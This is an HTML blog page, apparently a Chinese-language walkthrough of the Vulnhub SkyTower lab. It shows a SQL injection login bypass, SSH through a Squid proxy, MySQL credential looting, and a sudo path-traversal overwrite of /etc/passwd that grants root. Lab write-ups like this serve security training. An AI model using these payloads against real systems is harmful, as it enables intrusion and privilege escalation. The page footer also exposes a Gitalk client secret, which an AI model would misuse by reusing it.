@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-11SkyTower | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-11SkyTower</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:05:19</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>SkyTower</p>
+<p>拿到靶机，先arp-scan -l，找到虚拟机地址–192.168.111.130</p>
+<p>浅浅收集一下信息，nmap -p- 192.168.111.130</p>
+<p><img src="/vulnhub-11skytower//1.png" alt="1"></p>
+<p>nmap -p22,80,3128 -A 192.168.111.130</p>
+<p><img src="/vulnhub-11skytower//2.png" alt="2"></p>
+<p>22号端口可以进行ssh登录，但是现在没有账号密码，有80端口和3128端口都可以进行一下目录扫描</p>
+<p>80端口：登录页（POST传递账号密码），apache http server 2.2.22</p>
+<p>关于80端口的sql注入</p>
+<p>1.判断闭合符号是什么，过滤的字串有哪些，后端验证语句是什么</p>
+<p>经过尝试和猜测，我认为后端验证语句是</p>
+<p> <code>SELECT * FROM users WHERE username = &#39;user_input&#39; AND password = &#39;password_input&#39;</code></p>
+<p>如果要在username里注入就要把后面的语句尝试注释掉，于是，干脆在password注入</p>
+<p>其过滤了 <code>or</code></p>
+<p>已知OR可以用||代替，只要有一个为True整条语句即为True</p>
+<p>email&#x3D;admin&amp;password&#x3D;’||’1’’  &#x2F;&#x2F;<code>后面直接写了一个</code>‘1’进去，所有肯定True</p>
+<p>[^这个图片是后面登录之后查看的网页源码]: </p>
+<img src="/vulnhub-11skytower//6.png" alt="6" style="zoom:50%;">
+
+<p><img src="/vulnhub-11skytower//4.png" alt="4"></p>
+<img src="/vulnhub-11skytower//3.png" alt="3" style="zoom:50%;">
+
+<p>apache也没有漏洞 		3128端口：没有什么东西，是一个代理端口，我的理解是外网可以通过这个端口连接内网其他端口</p>
+<p>接住上面sql注入进去，提示用ssh登录user&#x3D;&#x3D;john；password&#x3D;&#x3D;hereisjohn</p>
+<p>发现连接超时，可能是只能让内网主机ssh，不过想起来 3128 端口设置的 Squid HTTP代理服务，尝试设置代理访问（这里需要权限，所以 <code>sudo</code>，直接 <code>root </code>用户也可以）</p>
+<p><code>vim /etc/proxychains4.conf</code></p>
+<p><img src="/vulnhub-11skytower//5.png" alt="5"></p>
+<p>把最后一行写进去就行了，同时只保留这一行，下次用的时候也只留需要用的这条</p>
+<p>然后连接ssh时需要配带上proxychains4文件    <code>proxychains ssh john@192.168.111.130 -t &quot;/bin/sh&quot;</code></p>
+<p>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’，交互式shell，但是回显没有python</p>
+<p><img src="/vulnhub-11skytower//6.png" alt="6"></p>
+<p><code>$db = new mysqli(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;, &#39;SkyTech&#39;);  //有了账号密码</code></p>
+<p>登录一下mysql吧  	<code>mysql -uroot -proot</code></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> \# 利用内置库查询数据库           注意句尾要有分号(;) </span><br><span class="line"><span class="number">2.</span> <span class="keyword">select</span> <span class="built_in">schema_name</span> <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="number">4.</span> \# 查询库下的表名</span><br><span class="line"><span class="number">5.</span> <span class="keyword">SELECT</span> <span class="built_in">table_name</span> <span class="keyword">FROM</span> information_schema.<span class="keyword">tables</span> <span class="keyword">WHERE</span> table_schema = &quot;SkyTech&quot;;</span><br><span class="line"><span class="number">6.</span>  </span><br><span class="line"><span class="number">7.</span> \# 查询字段名</span><br><span class="line"><span class="number">8.</span> <span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=&quot;login&quot; <span class="keyword">and</span> table_schema=<span class="string">&#x27;SkyTech&#x27;</span>;</span><br><span class="line"><span class="number">9.</span>  </span><br><span class="line"><span class="number">10.</span> \# 查询字段信息</span><br><span class="line"><span class="number">11.</span> use SkyTech;</span><br><span class="line"><span class="number">12.</span> </span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><img src="/vulnhub-11skytower//7.png" alt="7"></p>
+<p>分别登录之后发现新账号密码</p>
+<p><strong>Username: sara</strong><br><strong>Password: ihatethisjob</strong>（能登录，并且有更好一点权限）</p>
+<p><strong>Username: william</strong><br><strong>Password: senseable</strong>（不能登录，怀疑需要用私钥登录）</p>
+<p>find &#x2F; -name “ssh” 2&gt;&#x2F;dev&#x2F;null</p>
+<p><img src="/vulnhub-11skytower//8.png" alt="8"></p>
+<p>通过sudo -l发现有当前用户可以用root执行的命令</p>
+<p><img src="/vulnhub-11skytower//9.png" alt="9"></p>
+<p>可以用accounts来查flag，也可以提权吧</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/ls cat &gt; /accounts/../etc/passwd &lt;&lt;<span class="title class_">EOF</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> <span class="title class_">List</span> <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/bin/sh</span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> <span class="title class_">Bug</span>-<span class="title class_">Reporting</span> <span class="title class_">System</span> (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">libuuid:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">101</span>::/var/lib/<span class="symbol">libuuid:</span>/bin/sh</span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">65534</span>::/var/run/<span class="symbol">sshd:</span>/usr/sbin/nologin</span><br><span class="line"><span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">105</span><span class="symbol">:MySQL</span> <span class="title class_">Server</span>,,,<span class="symbol">:/nonexistent</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">john:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:john</span>,,,<span class="symbol">:/home/john</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">sara:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span>,,,<span class="symbol">:/home/sara</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">william:</span><span class="symbol">x:</span><span class="number">1002</span><span class="symbol">:</span><span class="number">1002</span><span class="symbol">:</span>,,,<span class="symbol">:/home/william</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="title class_">EOF</span></span><br></pre></td></tr></table></figure>
+
+<p>这里是直接把登录账号的uid和gid都改成了0</p>
+<p><code>sudo cat /accounts/../root/flag.txt   得到root密码theskytower </code></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-12sickos1-1/">Vulnhub-12SickOs1.1</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-10stapler/">Vulnhub-10stapler</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
